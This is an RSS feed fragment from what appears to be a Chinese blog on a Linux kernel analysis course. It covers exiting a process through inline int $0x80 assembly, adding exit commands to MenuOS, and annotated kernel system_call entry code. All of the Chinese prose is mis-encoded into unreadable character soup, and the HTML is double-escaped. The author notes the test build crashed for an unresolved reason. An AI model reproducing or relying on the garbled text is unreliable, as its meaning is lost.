&amp;lt;div style=&amp;quot;text-align: justify;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-family: Arial, Helvetica, sans-serif;&amp;quot;&amp;gt; exit(0);&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code>&lt;/pre>
&lt;p>æ§è¡ç»æå¦ä¸å¾æç¤ºï¼å¾ç®åï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-19-Linux-kernel-analysis-system-call/2018-09-19-01-36-15.png" alt="">&lt;/p>
&lt;p>è¿ç¨çéåºï¼è°ç¨ç³»ç»è°ç¨exitï¼ï¼å°±å¯å®æï¼å¨è¿éexitååºæ±ç¼çå½¢å¼ï¼æ¥è¯¢ç³»ç»è°ç¨è¡¨ï¼å¯ç¥exitçç³»ç»è°ç¨å·ä¸ºï¼ï¼ä½¿ç¨æ±ç¼ä»£ç æ¥ä¹¦åexitç³»ç»è°ç¨å¦ä¸ï¼&lt;/p>
&lt;pre>&lt;code class="language-c">/*************************************************************************
&amp;gt; File Name: Callexit_asm.c
&amp;gt; Author: GuoZe Tang
&amp;gt; Mail: 269831714@qq.com
&amp;gt; Created Time: Sun 29 Mar 2015 01:08:06 PM CST
************************************************************************/
#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;time.h&amp;gt;
#include&amp;lt;sys/types.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;
int main(int argc,char *argvs)
{
pid_t pc,pr;
int t;
pc =fork();
if(pc &amp;lt; 0)
printf(&amp;quot;Fork error!\n&amp;quot;);
else if(pc == 0){
printf(&amp;quot;This is child process with pid of %d\n&amp;quot;,getpid());
sleep(5);
}
else{
pr=wait(NULL);
printf(&amp;quot;I catched a child process with pid of %d\n&amp;quot;,pr);
}
asm volatile(
&amp;quot;mov $0x1,%%eax\n\t&amp;quot;
&amp;quot;mov $0x0,%%ebx\n\t&amp;quot;
&amp;quot;int $0x80\n\t&amp;quot;
&amp;quot;mov %%eax,%0\n\t&amp;quot;
:&amp;quot;=m&amp;quot; (t)
);
}
&lt;/code>&lt;/pre>
&lt;p>æ§è¡å¦ä¸ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-06-19-Linux-kernel-analysis-system-call/2018-09-19-01-36-42.png" alt="">&lt;/p></description></item><item><title>Linuxåæ ¸åæè¯¾ç¨5_System callä¸­æ­å¤çè¿ç¨</title><link>http://www.guozet.me/post/Linux-kernel-analysis-interrupt/</link><pubDate>Sun, 01 Mar 2015 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Linux-kernel-analysis-interrupt/</guid><description>&lt;p>Linuxåæ ¸è¯¾ç¬¬äºå¨ä½ä¸ãæ¬æå¨äºè¯¾å ä¸­å®éªæ¥¼å®æã&lt;br>
&lt;a href="http://guozet.me/about/" target="_blank" rel="noopener">åå½æ³½&lt;/a> ååä½åè½¬è½½è¯·æ³¨æåºå¤.&lt;br>
&lt;a href="http://mooc.study.163.com/course/USTC-1000029000" target="_blank" rel="noopener">ãLinuxåæ ¸åæãMOOCè¯¾ç¨&lt;/a>&lt;/p>
&lt;hr>
&lt;p>ä¸­æ­å¤ççä¸»è¦åå®¹ï¼&lt;/p>
&lt;ol>
&lt;li>è°è¯sys_exit()&lt;/li>
&lt;li>ç³»ç»è°ç¨æºä»£ç åæ&lt;/li>
&lt;li>ç³»ç»è°ç¨å°ç»&lt;/li>
&lt;/ol>
&lt;!-- more -->
&lt;h1 id="å å¥èªå®ä¹çç³»ç»è°ç¨callexit">å å¥èªå®ä¹çç³»ç»è°ç¨CallExit.&lt;/h1>
&lt;p>ä¿®æ¹menu/test.cæä»¶ï¼å å¥èªå·±å®ä¹çç³»ç»è°ç¨å½æ°ã&lt;/p>
&lt;pre>&lt;code class="language-cpp"> #include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
#include &amp;quot;menu.h&amp;quot;
#include&amp;lt;sys/types.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;
#define FONTSIZE 10
......
......
int CallExit(int argc,char *argvs)
{
pid_t pc,pr;
int t;
pc =fork();
if(pc &amp;lt; 0)
printf(&amp;quot;Fork error!\n&amp;quot;);
else if(pc == 0){
printf(&amp;quot;This is child process with pid of %d\n&amp;quot;,getpid());
sleep(5);
}
else{
pr=wait(NULL);
printf(&amp;quot;I catched a child process with pid of %d\n&amp;quot;,pr);
}
exit(0);
}
int CallExit_asm(int argc,char *argvs)
{
pid_t pc,pr;
int t;
pc =fork();
if(pc &amp;lt; 0)
printf(&amp;quot;Fork error!\n&amp;quot;);
else if(pc == 0){
printf(&amp;quot;This is child process with pid of %d\n&amp;quot;,getpid());
sleep(5);
}
else{
pr=wait(NULL);
printf(&amp;quot;I catched a child process with pid of %d\n&amp;quot;,pr);
}
asm volatile(
&amp;quot;mov $0x1,%%eax\n\t&amp;quot;
&amp;quot;mov $0x0,%%ebx\n\t&amp;quot;
&amp;quot;int $0x80\n\t&amp;quot;
&amp;quot;mov %%eax,%0\n\t&amp;quot;
:&amp;quot;=m&amp;quot; (t)
);
}
int main()
{
PrintMenuOS();
SetPrompt(&amp;quot;MenuOS&amp;gt;&amp;gt;&amp;quot;);
MenuConfig(&amp;quot;version&amp;quot;,&amp;quot;MenuOS V1.0(Based on Linux 3.18.6)&amp;quot;,NULL);
MenuConfig(&amp;quot;quit&amp;quot;,&amp;quot;Quit from MenuOS&amp;quot;,Quit);
MenuConfig(&amp;quot;time&amp;quot;,&amp;quot;Show System Time&amp;quot;,Time);
MenuConfig(&amp;quot;time-asm&amp;quot;,&amp;quot;Show System Time(asm)&amp;quot;,TimeAsm);
**MenuConfig(&amp;quot;CallExit&amp;quot;,&amp;quot;Exit Systemcall&amp;quot;,CallExit);**
**MenuConfig(&amp;quot;CallExit_asm&amp;quot;,&amp;quot;Exit_asm Systemcall&amp;quot;,CallExit_asm);**
ExecuteMenu();
}
&lt;/code>&lt;/pre>
&lt;p>å³å¨mainå½æ°ä¸­ï¼å å¥ç¸åºçç³»ç»è°ç¨å®ä¹ï¼è®²CallExitåCallExit_asmå å¥å°å¶ä¸­å»ï¼å¨QEMUä¸­å¯å¨ç³»ç»ä¹åå¯ä»¥è¾å¥helpçå°ï¼æä»¬çå½ä»¤ä¸­å¤äºä¸¤æ¡å½ä»¤ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-03-Linux-kernel-analysis-interrupt/2018-09-19-01-38-52.png" alt="">&lt;/p>
&lt;p>å¯æå¨è¿è¡ç³»ç»è°ç¨æµè¯çæ¶ååºç°äºé®é¢ï¼å¯¼è´ç³»ç»å´©æºäºï¼ææ¶è¿æ²¡ææµè¯åºæ¥ä»£ç ä¸­æ¯ä»ä¹å°æ¹åºç°äºé®é¢ï¼ä¼ç»§ç»­è°è¯æ¾åºé®é¢çå°æ¹ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-03-Linux-kernel-analysis-interrupt/2018-09-19-01-39-08.png" alt="">&lt;/p>
&lt;p>å³äºèå¸è§é¢ä¸­æå°çä¸è½è°è¯sys_timeçä¸äºåæï¼&lt;br>
&lt;a href="http://www.cnblogs.com/hazir/p/syscall_marco_define.html" target="_blank" rel="noopener">Linux Kernelä»£ç èºæ¯ââç³»ç»è°ç¨å®å®ä¹&lt;/a>&lt;/p>
&lt;p>å¯ä»¥åèè¿ä¸ç¯æç« ä¸­çåå®¹ï¼å¨2.6.28ä¹åçåæ ¸ä»£ç ä¸­ï¼ç³»ç»è°ç¨çæ¶åæ¯ç´æ¥è°ç¨å¤çå½æ°çï¼ä½åºç°äºæ¼æ´CVE-2009-0029æ¼æ´ä¹åï¼å°±æ¯éè¿å®å®ä¹çæ¹å¼æ¥å¤çç³»ç»è°ç¨å½æ°äºã&lt;/p>
&lt;hr>
&lt;h1 id="ç³»ç»è°ç¨æºä»£ç åæ">ç³»ç»è°ç¨æºä»£ç åæ&lt;/h1>
&lt;pre>&lt;code class="language-cpp"> # system call handler stub
ENTRY(system_call) //ææç³»ç»è°ç¨å½æ°çå¥å£å¤
RING0_INT_FRAME # can't unwind into user space anyway
ASM_CLAC
pushl_cfi %eax # ä¿å­ç³»ç»è°ç¨å·
SAVE_ALL # ä¿æ¤ç°åº
GET_THREAD_INFO(%ebp)ã#ä¿å­å½åä¿¡æ¯å°ebpä¸­
# system call tracing in operation / emulation
testl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%ebp)
jnz syscall_trace_entry
##å¤æ­æ¯å¦æ¯traceç¸å³çè°ç¨
##å¤æ­ç³»ç»è°ç¨å·æ¯å¦è¶åºäºæå¤§å¼255
cmpl $(NR_syscalls), %eax
jae syscall_badsys
syscall_call:
call *sys_call_table(,%eax,4) //ç±ç³»ç»è°ç¨è¡¨ä¸­çå¯¹åºç³»ç»è°ç¨å·æ¾æå¡å½æ°
syscall_after_call:
movl %eax,PT_EAX(%esp) # store the return value
#ç³»ç»è°ç¨è¿å
syscall_exit:ããã
LOCKDEP_SYS_EXIT
DISABLE_INTERRUPTS(CLBR_ANY) # make sure we don't miss an interrupt
# setting need_resched or sigpending
# between sampling and the iret
TRACE_IRQS_OFF
movl TI_flags(%ebp), %ecx
##éåºç³»ç»è°ç¨ä¹åï¼æ£æ¥æ¯å¦éè¦å¤çä¿¡å·
testl $_TIF_ALLWORK_MASK, %ecx # current-&amp;gt;work
jne syscall_exit_work
#æ¢å¤å¤çå¨å·¥ä½
restore_all:
TRACE_IRQS_IRET
restore_all_notrace:
#ifdef CONFIG_X86_ESPFIX32
movl PT_EFLAGS(%esp), %eax # mix EFLAGS, SS and CS
# Warning: PT_OLDSS(%esp) contains the wrong/random values if we
# are returning to the kernel.
# See comments in process.c:copy_thread() for details.
movb PT_OLDSS(%esp), %ah
movb PT_CS(%esp), %al
andl $(X86_EFLAGS_VM | (SEGMENT_TI_MASK &amp;lt;&amp;lt; 8) | SEGMENT_RPL_MASK), %eax
cmpl $((SEGMENT_LDT &amp;lt;&amp;lt; 8) | USER_RPL), %eax
CFI_REMEMBER_STATE
je ldt_ss # returning to user-space with LDT SS
#endif
restore_nocheck:
RESTORE_REGS 4 # skip orig_eax/error_code
irq_return:
INTERRUPT_RETURNãã//ä¸­æ­ç³»ç»è°ç¨çå¤çè¿ç¨ï¼ç»æç¹iret
.section .fixup,&amp;quot;ax&amp;quot;
ENTRY(iret_exc)
pushl $0 # no error code
pushl $do_iret_error
jmp error_code
.previous
_ASM_EXTABLE(irq_return,iret_exc)
#ifdef CONFIG_X86_ESPFIX32
CFI_RESTORE_STATE
ldt_ss:
#ifdef CONFIG_PARAVIRT
cmpl $0, pv_info+PARAVIRT_enabled
jne restore_nocheck
#endif
#define GDT_ESPFIX_SS PER_CPU_VAR(gdt_page) + (GDT_ENTRY_ESPFIX_SS * 8)
mov %esp, %edx /* load kernel esp */
mov PT_OLDESP(%esp), %eax /* load userspace esp */
mov %dx, %ax /* eax: new kernel esp */
sub %eax, %edx /* offset (low word is 0) */
shr $16, %edx
mov %dl, GDT_ESPFIX_SS + 4 /* bits 16..23 */
mov %dh, GDT_ESPFIX_SS + 7 /* bits 24..31 */
pushl_cfi $__ESPFIX_SS
pushl_cfi %eax /* new kernel esp */
/* Disable interrupts, but do not irqtrace this section: we
* will soon execute iret and the tracer was already set to
* the irqstate after the iret */
DISABLE_INTERRUPTS(CLBR_EAX)
lss (%esp), %esp /* switch to espfix segment */
CFI_ADJUST_CFA_OFFSET -8
jmp restore_nocheck
#endif
CFI_ENDPROC
ENDPROC(system_call)
# perform work that needs to be done immediately before resumption
ALIGN
RING0_PTREGS_FRAME # can't unwind into user space anyway
work_pending:
testb $_TIF_NEED_RESCHED, %cl #æ£æ¥æ¯å¦éè¦éæ°è°åº¦
jz work_notifysigãã#ä¸éè¦éæ°è°åº¦ï¼è°å°work_notifysig
work_resched: ããã#éæ°è°åº¦
call schedule #è¿ç¨è°åº¦
LOCKDEP_SYS_EXIT
DISABLE_INTERRUPTS(CLBR_ANY) # make sure we don't miss an interrupt
# setting need_resched or sigpending
# between sampling and the iret
TRACE_IRQS_OFF
movl TI_flags(%ebp), %ecx
andl $_TIF_WORK_MASK, %ecx # is there any work to be done other
# than syscall tracing?
jz restore_allãã//æ²¡æå¶ä½äºæï¼åæ¢å¤ç°åº
testb $_TIF_NEED_RESCHED, %cl
jnz work_resched
work_notifysig: # deal with pending signals and
# notify-resume requests
#ifdef CONFIG_VM86
testl $X86_EFLAGS_VM, PT_EFLAGS(%esp)
movl %esp, %eax
jne work_notifysig_v86 # returning to kernel-space or
# vm86-space
1:
#else
movl %esp, %eax
#endif
TRACE_IRQS_ON
ENABLE_INTERRUPTS(CLBR_NONE)
movb PT_CS(%esp), %bl
andb $SEGMENT_RPL_MASK, %bl
cmpb $USER_RPL, %bl
jb resume_kernel
xorl %edx, %edx
call do_notify_resumeãã#è¿è¡ä¿¡å·å¤ç
jmp resume_userspace
#ifdef CONFIG_VM86
ALIGN
work_notifysig_v86:
pushl_cfi %ecx # save ti_flags for do_notify_resume
call save_v86_state # %eax contains pt_regs pointer
popl_cfi %ecx
movl %eax, %esp
jmp 1b
#endif
END(work_pending)
# perform syscall exit tracing
ALIGN
syscall_trace_entry:
movl $-ENOSYS,PT_EAX(%esp)
movl %esp, %eax
call syscall_trace_enter
/* What it returned is what we'll actually use. */
cmpl $(NR_syscalls), %eax
jnae syscall_call
jmp syscall_exit
END(syscall_trace_entry)
# perform syscall exit tracing
ALIGN
syscall_exit_work: #å®æå¶ä»å·¥ä½
testl $_TIF_WORK_SYSCALL_EXIT, %ecx
#æ£æ¥æ¯å¦ç³»ç»è°ç¨è·è¸ª,å®¡è®¡,åæ­¥æ§è¡,ä¸éè¦åè·³å°work_pending(è¿è¡è°åº¦,ä¿¡å·å¤ç)
jz work_pending
TRACE_IRQS_ON
ENABLE_INTERRUPTS(CLBR_ANY) # could let syscall_trace_leave() call
# schedule() instead
movl %esp, %eax
call syscall_trace_leave
jmp resume_userspace
END(syscall_exit_work)
CFI_ENDPROC
RING0_INT_FRAME # can't unwind into user space anyway
syscall_fault:
ASM_CLAC
GET_THREAD_INFO(%ebp)
movl $-EFAULT,PT_EAX(%esp)
jmp resume_userspace
END(syscall_fault)
syscall_badsys:
movl $-ENOSYS,%eax
jmp syscall_after_call
END(syscall_badsys)
sysenter_badsys:
movl $-ENOSYS,%eax
jmp sysenter_after_call
END(sysenter_badsys)
CFI_ENDPROC
.macro FIXUP_ESPFIX_STACK
/*
* Switch back for ESPFIX stack to the normal zerobased stack
*
* We can't call C functions using the ESPFIX stack. This code reads
* the high word of the segment base from the GDT and swiches to the
* normal stack and adjusts ESP with the matching offset.
*/
#ifdef CONFIG_X86_ESPFIX32
/* fixup the stack */
mov GDT_ESPFIX_SS + 4, %al /* bits 16..23 */
mov GDT_ESPFIX_SS + 7, %ah /* bits 24..31 */
shl $16, %eax
addl %esp, %eax /* the adjusted stack pointer */
pushl_cfi $__KERNEL_DS
pushl_cfi %eax
lss (%esp), %esp /* switch to the normal stack segment */
CFI_ADJUST_CFA_OFFSET -8
#endif
.endm
.macro UNWIND_ESPFIX_STACK
&lt;/code>&lt;/pre>
&lt;p>SAVE_ALLä¿å­ç°åºå½æ°çå®å®ä¹å¦ä¸å¾æç¤ºï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2015-07-03-Linux-kernel-analysis-interrupt/2018-09-19-01-40-53.png" alt="">&lt;/p>
&lt;hr>
&lt;h1 id="ç³»ç»è°ç¨å°ç»">ç³»ç»è°ç¨å°ç»&lt;/h1>
&lt;p>ç³»ç»è°ç¨æµç¨å°ç»ï¼&lt;/p>
&lt;ol>
&lt;li>æ§è¡ç¨æ·ç¨åº(å¦:fork,exit)&lt;/li>
&lt;li>æ ¹æ®glibcä¸­çå½æ°å®ç°ï¼åå¾ç³»ç»è°ç¨å·å¹¶æ§è¡int $0x80äº§çä¸­æ­ã&lt;/li>
&lt;li>è¿è¡å°åç©ºé´çè½¬æ¢åå æ çåæ¢ï¼æ§è¡SAVE_ALLãï¼è¿è¡åæ ¸æ¨¡å¼ï¼&lt;/li>
&lt;li>è¿è¡ä¸­æ­å¤çï¼æ ¹æ®ç³»ç»è°ç¨è¡¨è°ç¨åæ ¸å½æ°ã&lt;/li>
&lt;li>æ§è¡åæ ¸å½æ°ã&lt;/li>
&lt;li>æ§è¡RESTORE_ALLå¹¶è¿åç¨æ·æ¨¡å¼&lt;/li>
&lt;/ol>
&lt;p>ç±»ä¼¼ä¸­æ­å¤çè¿ç¨ï¼å¯ä»¥ç¥éï¼å¨ä¸­æ­å½ä¸­è¿ä¸ªæ´ä½çæ¡æ¶æ¯ä¸ååççï¼åªæ¯ç¸åºçç³»ç»è°ç¨å·åå¤çå½æ°ä¹é´çè½¬åååæäºä¸­æ­å·åä¸­æ­å¤çå½æ°ä¹é´çè½¬åã&lt;/p>
&lt;pre>&lt;code class="language-flow">st=&amp;gt;start: int0x80-&amp;gt;ENTRY(system_call)
e=&amp;gt;end: Ende|future:&amp;gt;http://www.google.com
op1=&amp;gt;operation: SAVE_ALL(ä¿å­ç°åº)|past
op2=&amp;gt;operation: call *sys_call_table
op3=&amp;gt;operation: ç³»ç»è°ç¨å¤çç¨åºå°è¿åå¼å­å¥eax
cond1=&amp;gt;condition: æ¯å¦æå¶ä»ä¿¡å·æè°åº¦
io=&amp;gt;inputoutput: å¤çå¶ä»ä¿¡å·|future
cond2=&amp;gt;condition: æ¯å¦æè°åº¦ä¿¡å·
op4=&amp;gt;operation: call_scheduleï¼è¿ç¨è°åº¦ï¼
op5=&amp;gt;operation: RESTORE_ALL(æ¢å¤ç°åº)
op6=&amp;gt;operation: INTRRRUPT_RET(iret)
ããè¿åç¨æ·è¿ç¨
op7=&amp;gt;operation: ä¿å­ä¸­æ­ï¼è°ç¨ä¸ä¸æï¼è°åº¦
op8=&amp;gt;operation: æªæ¥åè°åº¦åæ¥
cond3=&amp;gt;condition: æ¯å¦æéåºä¿¡å·
st-&amp;gt;op1-&amp;gt;op2-&amp;gt;op3-&amp;gt;cond1
cond1(no,lift)-&amp;gt;op5-&amp;gt;op6
cond1(yes,right)-&amp;gt;io-&amp;gt;cond3(no)-&amp;gt;cond2(yes)-&amp;gt;op4-&amp;gt;op7-&amp;gt;op8
op8(right)-&amp;gt;op5
cond2(no,right)-&amp;gt;op5
&lt;/code>&lt;/pre></description></item></channel></rss>